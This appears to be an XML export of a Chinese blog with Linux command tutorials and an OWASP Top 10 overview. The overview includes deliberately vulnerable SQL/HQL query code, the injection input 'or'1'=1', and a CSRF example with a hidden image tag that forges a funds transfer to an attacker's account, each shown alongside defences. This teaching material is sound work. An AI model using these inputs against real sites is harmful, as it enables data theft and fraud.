196K102353779 -rw-r–r– 1 root root 11 Aug 12 09:40 date.txt 1478308 -rw-r–r– 1 root root 5.1K Aug 12 15:38 eee.txt ln -s aaaaaaaaaaaaaaaaa.txt a.txt //给aaaaaaaaaaaaaaaaa.txt源文件,创建一个软连接(之前不能存在)ln aaaaaaaaaaaaaaaaa.txt a.txt //给aaaaaaaaaaaaaaaaa.txt源文件,创建一个硬连接ln 直接创建的叫做硬链接文件,硬链接文件是源文件的另外一个入口.和源文件是同一个文件.特别说明:ln -s 参数是创建一个软连接,软连接和源文件不是同一个文件.如果删除源文件,软连接会无法访问;但是硬链接还正常. 第一列:inode节点号;第二列:第一个位表示文件类型; - 普通文件; d 目录文件; l 连接文件; 后边的9位表示文件的权限信息,每3位分为一组,分别代表:属主user/属组group/其他other 权限分为:r(read,读取;权限用4表示) w(write,写入,权限用2表示) x(excute,执行,权限用1表示):前提是一个可执行文件.用./文件名来执行. 默认在Linux中,目录的权限是755,文件权限默认是644.第三列:1表示的是文件的硬链接数.每创建一个硬链接,数值会加1.第四列:属主第五列:属组第六列:文件大小第七列—第九列:表示时间 第十列:文件名 2.修改文件权限: 方式一:使用英文字母的方式修改权限 chmod [u/g/o][+/-/=][rwx] 文件名 chmod a+x aa.txt //给aa.txt的所有人添加可执行权限 chmod u+x aa.txt //给aa.txt的属主添加可执行权限 chmod u=rwx aa.txt //给aa.txt的属主赋予”读,写,执行权限” 方式二:直接使用数字方式来修改权限 chmod 700 aa.txt //给aa.txt的属主所有权限;属组和其他人没有任何权限 chmod 755 aa.txt //给aa.txt的属主所有权限,属组和其他人有”读取和执行的权限” 常用参数:chmod -R 644 nload-0.7.4 //针对nload目录,-R递归修改权限为644.3.修改文件的属主和属组:chown root.root nload-0.7.4/* //把nload-0.7.4下的所有文件的属主和属组都修改为rootchown root.root nload-0.7.4 //把nload-0.7.4目录的属主和属组都修改为root 属主:属组ls -l //检查权限是否修改成功 练习:(1)在/test目录下创建一个文件aaaaaaaa.txt ;并写入内容为This is test for aaaaa.txt.(2)给aaaaaaaa.txt这个文件创建软连接为a.txt;(3)给aaaaaaaa.txt文件创建硬链接文件hard.txt;(4)使用ls -lhi 来查看3个文件的inode节点号的区别;(5)删除源文件aaaaaaaa.txt,看a.txt和hard.txt是否还能正常访问;(6)在/test/下创建一个可执行文件,叫ls.txt ,写入内容: #!/bin/bash #声明脚本的解释器 ifconfig ens33 echo 123456 &gt; ls.txt echo 678910 &gt;&gt; ls.txt(7)给这个文件赋予可执行权限,并查看结果.]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux汇总]]></title>
    <url>%2F2019%2F08%2F13%2Flinux%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[linux常用命令一、linux命令SHELL文件位于/bin/bashcat /etc/shells常见的linuxshell有sh、bash、csh、tcsh、ash 其中bash shell是linux默认的shell查看系统默认shell命令 echo $SHELL LINUX命令分类内部命令集成于 Shell 解释器程序内部的一些特殊指令，也称为内建（Built-in）指令 属于 Shell 的一部分 没有单独对应的系统文件 自动载入内存，可以直接使用 外部命令Linux系统中能够完成特定功能的脚本文件或二进制程序属于 Shell 解释器程序之外的命令每个外部命令对应了系统中的一个文件必须知道其对应的文件位置，由 Shell 加载后才能执行 注意Linux系统将存在外部命令、程序的目录默认添加到“搜索路径”中 当前使用位于这些目录中的外部命令时，用户不需要指定具体的位置。 Echo $PATH 通用的命令行使用格式命令字 【选项】 【参数】 命令字是整条命令中最关键的一部分唯一确定一条命令 注意：Linux命令环境中，对英文字符的处理是区分大小写的 选项短格式选项：使用“-”符号引导多个单字符选项可以组合在一起使用 —-ls -a ls -l ls -al长格式选项：使用“–”符号引导 参数命令字的处理对象可以是文件名、目录（路径）名或用户名等内容个数可以是零到多个 编辑 Linux 命令行的辅助操作 Tab 键反斜杠“\” —如果输入一行命令内容过长,终端会自动换行,也可以通过插入反斜杠\强制换行Ctrl＋U 快捷键 ——-快速删除光标之前的所有字符内容Ctrl＋K 快捷键—–快速删除从点前光标处到行尾的所有字符Ctrl＋L 快捷键—–快速清空屏幕显示Ctrl＋C 快捷键—-取消当前命令 如何获得命令帮助问题如何能快速、正确使用命令完成操作？ 取得帮助方法使用help 命令Help pwd使用“–help”选项使用man 手册页 (pageup pagedown翻页 q退出) help:大多数GNU工具都有–help 选项，用来显示工具的一些信息，用法 man:–(manual)显示系统的手册页,也就是查看帮助文档，如果系统没有文档，是不会显示这些帮助信息的，比help要详细 info:是一个基于菜单的超文本系统，是由GNU项目开发并由Linux发布，包括一些关于Linux Shell，工具，GNU项目开发程序说明文档,不但显示一些选项，还会有一些范例 注:一般man用的比较多，比help细，比info简单 目录和文件基本操作pwd 命令cd 命令ls 命令du 命令 显示当前的工作目录Pwd 将用户的工作目录更改到其他位置格式cd 目标位置cd ~cdcd - 说明切换到目标位置 若不指定目标位置，切换到当前用户的宿主目录 切换到上一次执行 cd 命令之前所在的目录 目录操作绝对目录：从根目录开始的路径表示方式相对目录：从当前目录开始的路径表示方式示例：cd .. 相对路径表示法进入上级目录。 显示目录中内容，包括子目录和文件相关属性信息ls [选项] [文件或目录… ]ls –l 标志d代表目录-代表文件l代表链接ls –a 连同显示隐藏文件，以.开头的文件或目录ls –d 显示目录本身的信息ls –h 以友好的表示方式显示信息 常用选项-l 、 -a 、 -A 、 -d 、 -h 、 -g 、 –color 结合通配符“?”：匹配文件名中的一个未知字符“*”：匹配文件名中的任意多个字符ls –color —在字符模式中颜色区分文件类型 深蓝色—-目录白色——-文件绿色—-可执行文件黄色—设备文件红色——压缩文件 通过别名机制简化常用的、比较长的命令alias 命令别名 = 命令 设置myls 为ls – alh 的别名alias myls = ‘ls – alh’永久保存定义别名的方式编辑 ~/.bashrc —–个人配置文件/etc/bashrc —–全局配置文件alias la=’ls -a -l’ 统计指定目录（或文件）所占用磁盘空间的大小du [选项] [文件或目录… ]选项 -a-h-s 示例 统计磁盘空间占用时包括所有的文件，而不仅仅只统计目录 显示出目录或文件的大小（K、M），默认的大小单位为字节（KB） 只统计每个参数所占用空间总的大小，而不是统计每个子目录、文件的大小 df –h显示剩余磁盘空间 mkdir 创建新的空目录rmdir 删除一个目录mkdir [选项] 目录位置及名称-p：一次性创建嵌套的多层目录Rmdir删除子目录时，必须是空的。 创建空文件 – touch 更新文件的时间标记 经常用于创建多个新的空文件touch 文件… 创建链接文件 – ln 为文件或目录建立链接文件 文件类型 软链接，又称符号链接（理解为快捷方式）硬链接ln [-s] 源文件或目录… 链接文件或目标位置​ 软链接-s 硬链接删除原始文件后 失效 仍旧可用使用范围 适用于文件或目录 只可用于文件保存位置 与原始文件可以位于不同的文件系统中 必须与原始文件在同一个文件系统（如一个Linux分区）内 取消软链接Unlink 链接名如：unlink aa1.txt查找指定inode号的硬链接文件ll –ifind / -inum 16810953 将需要复制的文件或目录（源）重建一份，并保存为新的文件或目录cp [选项]… 源文件或目录… 目标文件或目录…选项 说明 -f 覆盖目标同名文件或目录时不进行提醒，直接强制复制-i 覆盖目标同名文件或目录时提醒用户确认-p 复制时保持源文件的权限、属主及时间标记等属性不变-r 复制目录时必须使用此选项，表示递归复制所有文件及子目录注意：复制多个文件或目录时，目标位置必须是目录，且目标目录必须已存在复制文件的样式Cp 文件名 子目录中如：cd /rootcp initial-setup-ks.cfg a1cp 文件名 新文件名在当前目录复制出一个新文件支持通配符*？复制一个目录及里面所有文件到另一个目录中Cp –r b3 b34 删除指定的文件或目录rm [选项] 要删除的文件或目录… 常用选项-f(强制)、-i（友好提示）、-r（连同子目录） 其中rf可以组合使用猜一猜：下面命令实现的功能rm -rf public_html/grub/rm -i public_html/apg.conf注意：不要直接删除系统中已有的目录或配置文件，以避免出现意外故障 移动文件或目录mvmv [选项] … 源文件或目录… 目标文件或目录将指定的文件或目录转移位置如果目标位置 与源位置相同，则相当于执行重命名操作mv mytouch mkfilemv mkfile public_html/ 查找命令/文件存放目录 搜索范围由环境变量 PATH 决定（echo $PATH ）which 命令|程序名which -a 命令|程序名 查找文件或目录-find 采用递归方式，根据目标的名称、类型、大小等不同属性进行精细查找find [查找范围] [查找条件表达式]查找类型 关键字 说明按名称查找 -name 根据目标文件的名称进行查找，允许使用“”及“?”通配符 find / -name “.txt” -print #在当前目录中中查.txt文件并显示 find . -name “[A-Z]*” -print #在当前目录中查以大写字母开头的文件并显示 按文件大小查找 -size 根据目标文件的大小进行查找 一般使用“＋”、“-”号设置超过或小于指定的大小作为查找条件 常用的容量单位包括 kB（注意 k 是小写）、M、G find . -type f -empty #查找大小为0的文件或空目录 find . -type f -size +1000000c -print #查长度大于1Mb的文件 find . -type f -size +2k#搜索当前目录下大于2KB的文件按文件属主查找 -user 根据文件是否属于目标用户进行查找按文件类型查找 - type 根据文件的类型进行查找 文件类型包括普通文件（f）、目录（d）、块设备文件（b）、字符设备文件（c）等 块设备是指成块读取数据的设备（如硬盘、内存等），字符设备是指按单个字符读取数据的设备（如键盘、鼠标等） find . -type d -print #只列出当前目录所有的子目录 find . ! -type d -print #只列出当前目录的非子目录（文件） find . -type f -print #只列出当前目录所有的文件 find . -type l -print #只列出当前目录的所有符号链接 find . -type c -print #只列出当前目录的所有字符设备 find . -type b -print #只列出当前目录的所有块设备 find . -type s -print #只列出当前目录的所有套接字 find . -type p -print #只列出当前目录的所有Fifo扩展 Xargs find . -type d -empty | xargs rmdir #删除当前目录下所有空文件夹 find . -type f -empty | xargs rm -rf递归查找当前目录及子目录下所有空文件并删除，rm 的 -r参数表示递归，-f表示强制删除 find . -name “*.txt” | xargs rm -rf #查找当前目录下所有.txt文件并删除 例如：find . -type f -atime +10 -name “.txt” -exec cp {} /data ; #找到10天前访问的.txt文件并复制到/data目录中find . -perm -007 -exec ls -l {} ; #查所有用户都可读写执行的文件同-perm 777find . -type f -user root -exec chown ubuntu {} ; #将当前目录下所有root的文件改为属于ubuntufind /haha -name “grep.txt” -exec rm -rf {}find . -name ap -o -name may* #查找以ap或may开头的文件find / -name “aa*.log” –lsfind / -size +100M –lsfind /etc -size -10k -lsfind / -user abc -lsfind /root/b35 -type f -ls 各表达式之间使用逻辑运算符“-a”表示 而且（and）“-o”表示 或者（or） find /boot -size +1024k -a -name “vmlinuz“find /boot -size +1024k -o -name “vmlinuz“ 知识梳理查看及切换目录（pwd、cd、ls、du、df）创建目录和文件（mkdir、touch、ln）复制、删除、移动目录和文件（cp、rm、mv）查找目录和文件（which、find） 作业：1、 建立子目录/root/abc,在下面分别建立新子目录a1,b1,c1和文件a1.txt,b1.txt,c1.txt，将/etc/resolv.conf文件复制到a1目录中名称为r1.conf,在/root/abc/b1目录软链接此文件。2、 查找系统中hostname文件，复制到/root/abc/c1中，本目录复制出新文件h1.conf,然后删除/root/abc/c1/hostname文件。 文本编辑器 vi 命令一、文件内容编辑文本编辑器的作用创建或修改文本文件维护 Linux 系统中的各种配置文件 Linux中最常用的文本编辑器vi：类UNIX操作系统的默认文本编辑器。vim：vim是vi文本编辑器（一般简称为vi编辑器）的增强版本vi vim 三种工作模式命令模式、输入模式、末行模式不同模式之间的切换 I插入式a追加式o插入新行后进行编辑 命令模式的基本操作光标移动复制、粘贴、删除文件内容查找撤销编辑及保存退出 末行模式的基本操作保存文件及退出vi编辑器打开新文件或读入其他文件内容文件内容替换 vim kernel.txt (1)====&gt;命令模式:可以显示行号(:set nu ),可以查找信息(/word).支持上下左右键; 跳到行首^ 跳到行尾$ 跳到文档最开始:gg 跳到文档结尾:G 跳到某一行:10 //跳到第10行. yy //复制光标所在行 p //粘贴到光标所在行的下一行 dd //删除光标所在行 5yy //复制光标所在行开始向下的一共5行 d^ //删除光标所在行到行首 d$ //删除光标所在行到行尾 u //撤销操作 (2)====&gt;命令模式=====&gt;进入编辑模式:i (3)====&gt;命令模式=====&gt;进入编辑模式:i======&gt;末行模式Esc :wq //保存并退出 :q! //强制退出,不保存 :set nu //显示行号 /10 //查找文档中包含”10”的内容,跳转到下一个用n :w /test/test11/aaa.txt //把文件另存为aaa.txt :s/old/new/ //把光标所在行第一个old”替换为”new :s/old/new/g //把光标所在行所有的old”替换为”new :% s/old/new/g //把所有行的old”替换为”new :1,2 s/old/new/g //把第一行和第二行的old字符替换为new=====&gt;需要先执行set nu 文件操作一、文件内容查看查看文件内容 cat 命令 cat命令用途：显示出文件的内容cat [选项] 文件名 …cat –n 文件名显示文件内容同时显示行号 more命令用途：全屏方式分页显示文件内容 交互操作方法 按Enter键向下逐行滚动 按空格键向下翻一屏 按q键退出Ctrl+f 下翻 Ctrl+b上翻more [选项] 文件名 … less 命令用途：与 more 命令相同，但扩展功能更多 交互操作方法Page Up 向上翻页，Page Down 向下翻页按“/”键查找内容，“n”下一个内容，“N”上一个内容其他功能与 more 命令基本类似 less [选项] 文件名 … tail命令用途：查看文件结尾的少部分内容（默认为10行） tail -n 文件名 … 显示尾部指定行数 tail -f 文件名：动态观察文件变化 wc命令用途：统计文件中的单词数量（Word Count）等信息 常用命令选项-l：统计行数-w：统计单词个数-c：统计字节数wc [选项]… 目标文件… wc -l /etc/passwdwc -l /var/log/secure grep命令（支持正则表达式）用途：在文件中查找并显示包含指定字符串的行 常用命令选项-i：查找时忽略大小写-v：反转查找，输出与查找条件不相符的行查找条件设置要查找的字符串以双引号括起来“^……”表示以……开头，“……$”表示以……结尾“^$”表示空行grep [选项]… 查找条件 目标文件例如：grep -v “^#” /etc/yum.conf | grep -v “^$” Grep “^root” /etc/passwd 二、压缩命令gzip、bzip2gzip命令、bzip2命令用途：制作压缩文件、解开压缩文件常用命令选项-9、-dgzip [-9] 文件名… ——gzip工具压缩文件bzip2 [-9] 文件名…—–bzip2工具压缩文件gzip -d .gz格式的压缩文件 ——gzip工具解压文件bzip2 -d .bz2格式的压缩文件——bzip2工具解压文件请注意：gzip和bzip2命令使用的压缩算法各不相同一般来说bzip2的压缩效率要好一些gunzip 命令gunzip 等价于 gzip –dgzip -d mkfile.gz 或gunzip mkfile.gz bunzip2 命令bzip2和bunzip2命令的用法与gzip、gunzip命令基本相同 tar命令用途：制作归档文件、释放归档文件tar [选项] … 归档文件名 源文件或目录tar [选项]… 归档文件名 [-C 目标目录]常用命令选项-c、-x、-v、-f、-p、-t、 -C、-z、-j -c:创建.tar格式包文件-C:解压时指定释放的目标文件夹-f:表示使用归档-j:调用bzip2程序进行压缩或是解压-p:打包时保留文件及目录的权限-P:打包时保留文件及目录的绝对路径-t:列表查看包内的文件-v:输出详细信息-x:解压tar格式的包文件-z:调用gzip程序进行压缩或是解压压缩归档:Tar zcvf 自定义压缩后的文件名.tar.gz 压缩的对象Tar jcvf 自定义压缩后的文件名.tar.bzip2 压缩的 对象解压:Tar zxfv 压缩文件.tar.gz -C 解压后存放的目录Tar jxvf 压缩文件.tar.bzip2 -C 解压后存放的目录 作业：1、英文和中文安装LINUX；2、写出下面命令功能：Date、whoami、hostname、ifconfig、alias、ping、reboot 、halt 、shutdown 程序安装及管理一、应用程序基础将软件传到LINUX中yum install lrzsz（注意：LINUX要能连入互联网，ping www.qq.com） 应用程序与系统命令的关系文件位置 系统命令：一般在/bin和/sbin目录中，或为Shell内部指令 应用程序：通常在/usr/bin和/usr/sbin目录中 主要用途 系统命令：完成对系统的基本管理工作，例如IP配置工具 应用程序：完成相对独立的其他辅助任务，例如网页浏览器 适用环境系统命令：一般只在字符操作界面中运行应用程序：根据实际需要，有些程序可在图形界面中运行 运行格式系统命令：一般包括命令字、命令选项和命令参数应用程序：通常没有固定的执行格式 典型应用程序的目录结构文件类型 保存目录普通执行程序文件 /usr/bin服务器执行程序文件和管理程序文件 /usr/sbin应用程序配置文件 /etc日志文件 /var/log应用程序文档文件 /usr/share/doc应用程序手册页文件 /usr/share/man 常见的软件包封装类型文件类型 保存目录 rpm软件包 扩展名为“.rpm”deb软件包 扩展名为“.deb”源代码软件包 一般为“.tar.gz”、“.tar.bz2”等格式的压缩包，包含程序的原始代码绿色免安装的软件包 在压缩包内提供已编译好的执行程序文——解开压缩包后的文件即可直接使用 Centos软件包管理rpm软件包RPMRedhat Package Manager由 Red Hat 公司提出，被众多 Linux 发行版所采用建立统一的数据库文件详细记录软件包安装、卸载等变化信息自动分析软件包依赖关系RPM 软件包软件素材参考：http://www.rpm.org 一般命名格式：查询已安装的 RPM 软件信息rpm -q[子选项] [软件名]常用选项 -qa、-qi、 -ql、 -qf、-qc、-qdRpm –qa查询所有安装的rpm软件包Rpm –qi 查询已安装的某软件包的信息Rpm –ql查询已安装的某软件包安装路径 查询未安装的 RPM 软件包文件中信息rpm - qp[子选项] RPM包文件常用选项-qpi、-qpl、-qpc、-qpd 使用rpm 命令只能查询通过 RPM方式安装的软件包信息用，其他途径安装到系统中的软件包，rpm 命令将无法获取相关信息 安装或升级RPM 软件rpm [选项] RPM包文件 …-i :在当前系统中安装一个新的RPM软件包-e:卸载指定名称的软件包-U:检查并升级系统中的某个软件包,若该软件包原来并未安装,曾等同于”-i”选项-F:检查并更新系统中的某个软件包,若该软件包原来并未安装,则放弃安装-h:在安装或升级软件包的过程中,以”#”号显示安装进度-v:显示软件安装过程中的详细信息–force:强制安装某个软件包,当需要替换已安装的软件包及文件,或者安装一个比当前使用的软件版本更旧的软件时,可以使用此选项–nodeps:在安装或升级,卸载一个软件包时,不检查与其他软件包的依赖关系 常用选项 -i、 -U、 -F安装 升级 强制-vh显示安装进度rpm -ivh 软件包卸载指定的RPM软件rpm -e 软件名 辅助选项–force、–nodeps、-h、-v、 重建RPM 数据库[root@localhost ~]# rpm –rebuilddb 或[root@localhost ~]# rpm –initdb 导入验证公钥root@localhost ~]# rpm –import /media/cdrom/RPM-GPG-KEY-redhat-release 解决软件包依赖关系方法 安装有依赖关系的多个软件 卸载有依赖关系的多个软件 忽略依赖关系结合“–nodeps”选项，但可能导致软件异常 源代码编译概述 使用源代码安装软件的优点获得最新的软件版本，及时修复bug根据用户需要，灵活定制软件功能 应用场合举例安装较新版本的应用程序时当前安装的程序无法满足需要时需要为应用程序添加新的功能时 源代码编译过程 二、YUM安装软件YUM，Yellow dog Updater Modified基于RPM包构建的软件更新机制可以自动解决依赖关系所有软件包由集中的YUM软件仓库提供 软件仓库的提供方式FTP服务：ftp://……HTTP服务：http://……本地目录：file:///……. RPM软件包的来源CentOS发布的RPM包集合第三方组织发布的RPM包集合用户自定义的RPM包集合 构建CentOS 7 软件仓库RPM包来自CentOS 7 DVD光盘通过FTP、HTTP或本地目录提供给客户机在软件仓库中加入非官方RPM包组包括存在依赖关系的所有RPM包使用createrepo工具建立仓库数据文件 YUM缓存目录存放下载的软件包、仓库信息等数据位于/var/cache/yum/$basearch/$releasever[root@localhost ~]# yum clean all 为客户机指定YUM仓库位置配置文件：/etc/yum.repos.d/*.repo[root@localhost ~]# vi /etc/yum.repos.d/centos7.repo[base]name=CentOS 7.5baseurl=ftp://192.168.4.254/centos7enabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7[other]name=Other RPM Packagesbaseurl=ftp://192.168.4.254/otherenabled=1gpgcheck=0 直接以CentOS 7 光盘作软件仓库 将CentOS 7 光盘放入光驱 指定仓库位置，URL地址为 file:///media/cdrom[root@localhost ~]# vi /etc/yum.repos.d/local.repo……[local] name=CnetOS 7.3baseurl=file:///media/cdromenabled=1gpgcheck=0 关于yum命令由软件包yum-3.4.3-150.el7.centos.noarch提供用来访问YUM仓库，查询、下载及安装、卸载软件包 yum的配置文件基本设置：/etc/yum.conf仓库设置：/etc/yum.repos.d/*.repo日志文件：/var/log/yum.log 查询软件包yum list [软件名]…yum info [软件名]…yum search &lt;关键词&gt;… 查询软件包组yum grouplist [包组名]…yum groupinfo &lt;包组名&gt;… 安装软件yum install [软件名]yum groupinstall &lt;包组名&gt; 升级软件yum updateyum groupupdate 卸载软件yum remove &lt;软件名&gt;…yum groupremove &lt;包组名&gt;… yum安装: yum源配置文件所在位置:/etc/yum.repos.d/注意:此目录下有许多.repo的配置文件,可以全部移走,然后自己创建一个XXX.repo的源文件 编辑XXX.repo的源文件编辑内容: [名字] ——-自定义 Baseurl=file:///media ——定义yum源仓库为光驱的挂载点 enabled=1 ——-0 :关闭源 1表示开启源 Gpgcheck=0 ——0:不去校验包 1:校验包 效率低 保存退出 安装命令Yum install 包名 源码包安装:（需要gcc） 下载源码包 解压源码包tar zxvf 软件名.tar.gz -C /解压目录 ——–解压压缩文件到指定目录里面 配置./configure –prefix=/软件放置目录 ——-重新配置软件安装后文件存放的位置 编译Make ———重新编译二进制 编译安装Make install ——–编译安装 作业：1．图示源代码编译安装程序的基本过程，并写出每个过程的作用？2．在执行“./configure”配置时加“–prefix”选项的作用是什么？3．安装nload,监控自己服务器流量一分钟内变化。]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OWASP TOP10]]></title>
    <url>%2F2019%2F08%2F12%2FOWASP-TOP10%2F</url>
    <content type="text"><![CDATA[OWASP的安全威胁OWASP(开放Web软体安全项目- Open Web Application Security Project) 是一个开源的、非盈利的全球性安全组织，致力于应用软件的安全研究。其使命是使应用软件更加安全，使企业和组织能够对应用安全风险作出更清晰的决策。目前OWASP全球拥有130个分会近万名会员，共同推动了安全标准、安全测试工具、安全指导手册等应用安全技术的发展。 OWASP Top 10十大风险 – 10个最重大的Web应用风险与攻防OWASP TOP101：Injection 注入 2：失效的身份认证和会话管理 3.跨站 4.不安全的对象的直接引用 5.伪造跨站请求 6.安全误配置 7：限制URL访问失败 8：未验证的重定向和转发 9.应用已知脆弱性的组件 10：敏感数据暴露 TOP1-Injection 注入介绍：简单来说，注入往往是应用程序缺少对输入进行安全性检查所引起的，攻击者把一些包含指令的数据发给解释器。解释器会把收到的数据转换成指令执行常见的注入包括SQL注入，OS shell，LDAP，Xpath，Hibernate等等，而其中SQL注入尤为常见。这种攻击所造成的后果往往很大 ，一般整个数据库的信息都能读取或篡改，通过SQL注入，攻击者甚至能够获得更多地包括管理员的权限。 危害：注入能导致数据丢失或数据破坏、缺乏可审计性或是拒绝服务。注入漏洞有时甚至能导致完全接管主机。 TOP1-注入的示例案例1.应用程序在下面存在漏洞的SQL语句的构造中使用不可信数据： String querry = “SELLECT * FROM accounts WHERE cutID =”+request.getParameter(“ID”)+”‘“ “； 案例2.同样的，框架应用的盲目信任，仍然可能导致查询语句的漏洞。（例如：Hibernate查询语言（HQL））: Query HQLQuery = session.createQuery(“FROM accounts WHERE custID=’’’+request.getParameter(“id”)+“’”); 在这两个案例中，攻击者在浏览器中将“id”参数的修改成’or’1’=1’ TOP1-注入的防范1.使用安全的API，避免使用解释器或提供参数化的接口（prepared statements，or stored procedures） 2.使用白名单来规范化的输入验证方法 3.对输入的特殊字符进行Escape转义处理 4.权限最小化，减轻被注入的影响 使用ESAPI（https://github.com/ESAPI/esapi-java-legacy） ESAPI:简单来说就是为编写更加安全的代码设计出来的一些API，方便使用者调用，从而方便的编写安全代码。 TOP2-失效的身份认证和会话管理介绍：与认证和会话管理相关的应用程序功能往往得不到正确措施，这就导致攻击者破坏密码、密钥、会话令牌或利用实施漏洞冒充其他用户身份 危害：这些漏洞可能导致部分甚至全部账户遭受攻击。一旦攻击成功，攻击者能执行合法用户的任意操作。因此特权账户会造成更大的危害。 防范：防范：使用强大的认证和会话管理控制-OWASP的应用安全验证标准。 1.使用简单集中标准化的认证方式； 2.确保SSL在任何时候都会保护会话； 3.使用会话管理功能； 会话管理：当用户不操作时，系统必须自动终止超时会话，必须有时间限制；必须提供退出功能，允许用户强制退出会话；会话标识足够随机，防止攻击者猜测到标识；用户登录后必须分配新的会话标识，不使用用户未登录前所使用的标识，防止会话攻击。 TOP3-跨站介绍：跨站脚本是普遍的WEB应用安全漏洞。当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当的验证或转译，就会导致跨站脚本。 危害：攻击者能在受害者浏览器执行脚本以劫持用户会话、迫害网站、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器等等。 种类：已知有三种著名的跨站漏洞：1.存储式 2.反射式 3.基于DOM 反射式跨站脚本通过测试或代码分析很容易找到 TOP3-防范验证输入 验证输入很简单-检查每个输入的有效性。这可能意味着很多的东西，但在典型的和简单的情况下，这意味着检查输入类型和数据的长度。例如，如果你是从一个文本框接受一个一个标准的邮政编码，你会知道，唯一有效的的类型都是一个数字（0-9），而长度应该是6，不能多也不能少。并非所有的案件都如此简单，但很多是相似的。 编码输出 对验证输入的另一面就是编码输出。编码输出，是用来确保字符被视为数据，而不是作为HTML元字符被浏览器解析。这些技术定义一些特殊的“转义“字符。没有正确转义的数据它仍然会在浏览器中正确解析。编码输出，只是让 浏览器知道数据是不是要被解析， 达到攻击无法实现的目的。 1.对所有不可信的输入数据进行恰当的转义escape 2.使用白名单的具有恰当的规范化解码功能的输入验证方法 3.使用内容安全策略(CSP)来抵御整个站点的攻击 TOP3-复杂的 HTML 代码提交，如何处理？使用sanitizer防护 允许title全部可用 允许herf只能在标签中使用 指定lang align属性的格式 确定使用的标签列表 TOP4-不安全的对象直接引用介绍： 所谓”不安全的对象直接引用”,即Insecure direct object references ,意指一个已经授权的用户,通过更改访问时的一个参数，从而访问到原本其并没有得到授权的对象。Web应用往往在生成Web页面时会用它的真实名字,且并不会对所有的目对象访问时来检查用户权限, 所以这就造成不安全的对象直接引用的漏洞。 我们看如下的一个示例,也许这样就更容易理解什么是不安全的对象直接引用。1.攻击者发现他自己的参数是6065 ,即?acct=6065 ;2.他可以直接更改参数为6066 ,即?acct=6066;3.这样他就可以直接看到6066用户的账户信息。 危害： 这种漏洞能损害参数所弓|用的所有数据。除非名字空间很稀疏,否则攻击者很容易访问该类型的所有数据。 TOP4-防范使用基于用户或会话的间接对象访问，这样能防止攻击者直接攻击未授权资源访问检查:对任何来自不受信源所使用的所有直接对象弓用都进行访问控制检测,这样才能确保用户对要求的对象有访问权限避免在URL或网页中直接引|用内部文件名或数据库关键字。可使用自定义的映射名称来取代直接对象名锁定网站服务 器上的所有目录和文件夹,设置访问权限。验证用户输入和URL请求,拒绝包含/或./的请求。 TOP5-伪造跨站请求（CSRF）介绍： 跨站请求伪造CSRF ,是利用了网站允许攻击者预测特定操作的所有细节这一特点。由于浏览器自动发送会话cookie等认证凭证,导致攻击者能够创建恶意的web页面来产生伪造请求。这些伪造的请求很难和合法的请求区分开。 CSRF听起来像跨站脚本( XSS) , 但它与XSS不同,并且攻击方式几乎相左。XSS利用站点内的信任用户,而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。 危害： 攻击者能够让受害用户修改任何允许修改的数据,执行任何用户允许的操作。例如修改密码、登陆注销等。 TOP5-案例应用程序允许用户提交不包含任何保密字段的状态改变请求，如:http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243因此，攻击者构建一个请求，用于将受害用户账户中的现,金转移到自己账户。然后攻击者在其控制的多个网站的图片请求或iframe中嵌入这种攻击 imgsrc=”http://example.com/app/transferFunds?amount= 1500&amp;destinationAccount=attackersAcct#”width=”0” height=”0” / 如果受害用户通过example.com认证后访问任何-一个攻击者的网站，伪造的请求将自动包含用户的会话信息，授权执行攻击者的请求。 TOP5-防范通用防范给每个HTTP请求添加一 个不可预测的令牌,并保证该令牌对每个用户会话来说是唯一性。最好的办法是将独有的令牌包含在隐藏字段中,通过HTTP请求发送,避免在URL中暴露出来。要求用户重新认证或者判断他们是一个真实的用户。 TOP6-安全误配置介绍安全配置错误可以发生在一个应用程序堆栈的任何层面,包括平台、Web服务器、应用服务器、数据库、架构和自定义代码。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等,以获得对系统未授权的访问。 危害系统可能在未知的情况下被完全攻破,用户数据可能随着时间推移而被全部盗走或者篡改。甚至有时,会导致整个系统被破坏。 TOP6-案例案例#1:应用程序服务器管理员控制台自动安装后没有被删除。而默认帐户也没有被改变。攻击者在你的服务器上发现了标准的管理员页面，通过默认密码登录，从而接管了你的服务器。案例#2:目录列表在你的服务器上未被禁用。攻击者发现只需列出目录，她就可以找到你服务器上的任意文件。攻击者找到并下载所有已编译的Java类，她通过反编译获得了所有你的自定义代码。然后，她在你的应用程序中找到一个访问控制的严重漏洞。log. csdin. het/案例#3:应用服务器配置允许堆栈跟踪返回给用户，这样就暴露了潜在的漏洞。攻击者热衷于收集错误消息里提供的额外信息。案例#4:应用服务器自带的示例应用程序没有从您的生产服务器中删除。该示例应用有已知安全漏洞，攻击者可以利用这些漏洞破坏您的服务器。 TOP6-防范自动化安装部署,保证开发、QA、产品环境的配置尽量相同,减少部署一 个新安全环境的耗费。及时了解并部署每个环境的软件更新和补丁信息使用提供有效分离和安全性强大的应用程序架构实施漏洞扫描和安全审计,以帮助检查错误的配置或者未安装的补丁现代JavaEE应用程序和框架如Struts , Spring都有很多的安全配置,当使用这些框架一定要确保这些配置是正确的。比如:在开发Web应用程序时一定要当心security-constraint 里的http-method标签，该标签的意思是security-constraint只作用于标签里面列出的方法,黑客可以利用这个使用列表以外的方法如: HEAD和PUT进行攻击,从而越过安全限制。大多数情况下开发者应该删掉web.xml里面的http-method标签。 TOP7-限制URL访问失败（缺少功能级访问控制）介绍： 这个漏洞事实上地是与认证相关的,与我们前面提到的Top4不安全的直接对象引用也是类似的,不同在于这个漏洞是说系统已经对URL的访问做了限制,但这种限制却实际并没有生效。常见的错误是,我们在用户认证后只显示给用户认证过的页面和菜单选项,而实际上这些仅仅是表示层的访问控制而不能真正生效,攻击者能够很容易的就伪造请求直接访问未被授权的页面。 危害： 攻击者很容易就把网址改成享有特权的网页,这样就可以使用匿名或普通用户访问未受保护的私人页面,从而提升未授权功能和相关数据信息。 